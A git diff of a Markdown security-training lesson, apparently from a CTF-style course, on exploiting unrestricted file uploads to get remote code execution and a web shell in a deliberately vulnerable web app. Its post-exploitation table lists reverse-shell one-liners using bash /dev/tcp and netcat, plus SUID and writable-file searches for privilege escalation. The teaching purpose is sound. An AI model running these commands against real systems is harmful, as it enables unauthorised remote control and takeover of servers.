@@ -168,16 +168,16 @@ Now that we have an initial lead, let’s use a search query to find all logs th
 
 ![](log4.png){: width="1825" height="802"}
 
-### OPERATION RED
+## OPERATION RED
 
 In this section we will now take a look at the red aspect. In other words, the attack itself and how it was carried out.
 
-## Why Do Websites Allow File Uploads
+### Why Do Websites Allow File Uploads
 
 File uploads are everywhere on websites, and for good reason. Users often need to upload files like profile pictures, invoices, or other documents to update their accounts, send receipts, or submit claims. These features make the user experience smoother and more efficient. But while this is convenient, it also creates a risk if file uploads aren't handled properly. If not properly secured, this feature can open up various vulnerabilities attackers can exploit.
 
 
-## File Upload Vulnerabilities
+### File Upload Vulnerabilities
 
 File upload vulnerabilities occur when a website doesn't properly handle the files that users upload. If the site doesn't check what kind of file is being uploaded, how big it is, or what it contains, it opens the door to all sorts of attacks. For example:
 
@@ -186,7 +186,7 @@ File upload vulnerabilities occur when a website doesn't properly handle the fil
 These can happen if a site doesn't properly secure its file upload functionality.
 
 
-## Why Unrestricted File Uploads Are Dangerous
+### Why Unrestricted File Uploads Are Dangerous
 
 Unrestricted file uploads can be particularly dangerous because they allow an attacker to upload any type of file. If the file's contents aren't properly validated to ensure only specific formats like PNG or JPG are accepted, an attacker could upload a malicious script, such as a PHP file or an executable, that the server might process and run. This can lead to code execution on the server, allowing attackers to take over the system.
 
@@ -196,7 +196,7 @@ Examples of abuse through unrestricted file uploads include:
 - Uploading a crafted image file that triggers a vulnerability when processed by the server.
 - Uploading a web shell and browsing to it directly using a browser.
 
-## Usage of Weak Credentials
+### Usage of Weak Credentials
 One of the easiest ways for attackers to break into systems is through weak or default credentials. This can be an open door for attackers to gain unauthorised access. Default credentials are often found in systems where administrators fail to change initial login details provided during setup. For attackers, trying a few common usernames and passwords can lead to easy access.
 
 Below are some examples of weak/default credentials that attackers might try:
@@ -210,13 +210,13 @@ Below are some examples of weak/default credentials that attackers might try:
 
 Attackers can use tools or try these common credentials manually, which is often all it takes to break into the system.
 
-## What is Remote Code Execution (RCE)
+### What is Remote Code Execution (RCE)
 
 Remote code execution (RCE) happens when an attacker finds a way to run their own code on a system. This is a highly dangerous vulnerability because it can allow the attacker to take control of the system, exfiltrate sensitive data, or compromise other connected systems.
 
 ![](key.png){: width="1046" height="800"}
 
-## What Is a Web Shell
+### What Is a Web Shell
 
 A web shell is a script that attackers upload to a vulnerable server, giving them remote control over it. Once a web shell is in place, attackers can run commands, manipulate files, and essentially use the compromised server as their own. They can even use it to launch attacks on other systems.
 
@@ -230,11 +230,11 @@ A web shell typically gives the attacker a web-based interface to run commands. 
 
 Okay, now that we're familiar with a remote code execution vulnerability and how it works, let's take a look at how we would exploit it!
 
-## Practice Makes Perfect
+### Practice Makes Perfect
 
 To understand how a file upload vulnerability can result in an RCE, the best approach is to get some hands-on experience with it. A handy (and ethical) way to do this is to find and download a reputable open-source web application which has this vulnerability built into it. Many open-source projects exist in places like GitHub, which can be run in your own environment to experiment and practice. In today's task, we will demonstrate achieving RCE via unrestricted file upload within an [open-source railway management system](https://github.com/CYB84/CVE_Writeup/tree/main/Online%20Railway%20Reservation%20System) that has this vulnerability [built into it.](https://github.com/CYB84/CVE_Writeup/blob/main/Online%20Railway%20Reservation%20System/RCE%20via%20File%20Upload.md)
  
-## Exploiting RCE via File Upload
+### Exploiting RCE via File Upload
 
 Now we're going to go through how this vulnerability can be exploited. For now, you can just read along, but an opportunity to put this knowledge into practice is coming up. Once an RCE vulnerability has been identified that can be exploited via file upload, we now need to create a malicious file that will allow remote code execution when uploaded.
 
@@ -279,20 +279,20 @@ Now, we can run commands directly against the operating system using this bar, a
 
 Once the vulnerability has been exploited and you now have access to the operating system via a web shell, there are many next steps you could take depending on a) what your goal is and b) what misconfigurations are present on the system, which will determine exactly what we can do. Here are some examples of commands you could run once you have gained access and why you might run them (if the system is running on a Linux OS like our example target system):
 
-| **Command**                              | **Use**                                                                                         |
-|------------------------------------------|-------------------------------------------------------------------------------------------------|
-| ls                                       | Will give you an idea of what files/directories surround you                                     |
-| cat                                      | A command used to output the contents of documents such as text files                           |
-| pwd                                      | Will give you an idea of where in the system you are                                           |
-| whoami                                   | Will let you know who you are in the system                                                     |
-| hostname                                 | The system name and potentially its role in the network                                         |
-| uname -a                                 | Will give you some system information like the OS, kernel version, and more                     |
-| id                                       | If the current user is assigned to any groups                                                   |
-| ifconfig                                 | Allows you to understand the system's network setup                                             |
+| **Command**                               | **Use**                                                                                         |
+|-------------------------------------------|-------------------------------------------------------------------------------------------------|
+| ls                                        | Will give you an idea of what files/directories surround you                                     |
+| cat                                       | A command used to output the contents of documents such as text files                           |
+| pwd                                       | Will give you an idea of where in the system you are                                           |
+| whoami                                    | Will let you know who you are in the system                                                     |
+| hostname                                  | The system name and potentially its role in the network                                         |
+| uname -a                                  | Will give you some system information like the OS, kernel version, and more                     |
+| id                                        | If the current user is assigned to any groups                                                   |
+| ifconfig                                  | Allows you to understand the system’s network setup                                             |
 | bash -i >& /dev/tcp/<your-ip>/<port> 0>&1  | A command used to begin a reverse shell via bash                                               |
-| nc -e /bin/sh <your-ip> <port>           | A command used to begin a reverse shell via Netcat                                             |
-| find / -perm -4000 -type f 2>/dev/null   | Finds SUID (Set User ID) files, useful in privilege escalation attempts                         |
-| find / -writable -type f 2>/dev/null | grep -v "/proc/" | Also helpful in privilege escalation attempts used to find files with writable permissions   |
+| nc -e /bin/sh <your-ip> <port>            | A command used to begin a reverse shell via Netcat                                             |
+| find / -perm -4000 -type f 2>/dev/null    | Finds SUID (Set User ID) files, useful in privilege escalation attempts                         |
+| find / -writable -type f 2>/dev/null | grep -v "/proc/"                               | Also helpful in privilege escalation attempts used to find files with writable permissions |
 
 These are just some commands that can be run following a successful RCE exploit. It's very open-ended, and what you can do will rely on your abilities to inspect an environment and vulnerabilities in the system itself.
 
